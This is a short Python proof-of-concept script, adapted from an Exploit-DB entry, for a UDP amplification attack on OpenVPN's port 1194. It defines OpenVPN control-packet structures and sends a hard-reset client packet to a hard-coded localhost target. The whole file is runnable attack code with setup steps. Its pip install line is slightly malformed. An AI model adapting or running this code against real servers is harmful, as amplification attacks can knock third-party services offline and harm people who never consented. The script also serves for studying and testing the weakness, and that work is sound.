#!/usr/bin/env python3

# Adapted from: https://www.exploit-db.com/exploits/41993

'''
$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip install construct=2.8.22

$ ./udp_1194_amplification.py
'''

import os
import socket

from construct import *


SessionID = Bytes(8)

PControlV1 = Struct(
    "packet_id" / Int32ub,
    "data" / GreedyBytes,
)

PAckV1 = Struct(
    "remote_session_id" / SessionID,
)

PControlHardResetClientV2 = Struct(
    "packet_id" / Int32ub,
)

PControlHardResetServerV2 = Struct(
    "remote_session_id" / SessionID,
    "packet_id" / Int32ub,
)

OpenVPNPacket = Struct(
    EmbeddedBitStruct(
        "opcode" / Enum(BitsInteger(5),
                        P_CONTROL_HARD_RESET_CLIENT_V1=1,
                        P_CONTROL_HARD_RESET_SERVER_V1=2,
                        P_CONTROL_HARD_RESET_CLIENT_V2=7,
                        P_CONTROL_HARD_RESET_SERVER_V2=8,
                        P_CONTROL_SOFT_RESET_V1=3,
                        P_CONTROL_V1=4,
                        P_ACK_V1=5,
                        P_DATA_V1=6),
        "key_id" / BitsInteger(3),
    ),
    "session_id" / SessionID,
    "ack_packets" / PrefixedArray(Int8ub, Int32ub),
    Embedded(Switch(this.opcode,
                    {
                        "P_CONTROL_V1": PControlV1,
                        "P_ACK_V1": PAckV1,
                        "P_CONTROL_HARD_RESET_CLIENT_V2": PControlHardResetClientV2,
                        "P_CONTROL_HARD_RESET_SERVER_V2": PControlHardResetServerV2,
                    })),
)


def main():
    """Proof of concept to execute the UDP amplification attack."""

    HOST, PORT = "127.0.0.1", 1194

    session_id = os.urandom(8)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    reset_client = OpenVPNPacket.build({
        "opcode": "P_CONTROL_HARD_RESET_CLIENT_V2",
        "key_id": 0,
        "session_id": session_id,
        "ack_packets": [],
        "packet_id": 0,
    })
    sock.sendto(reset_client, (HOST, PORT))


if __name__ == '__main__':
    main()
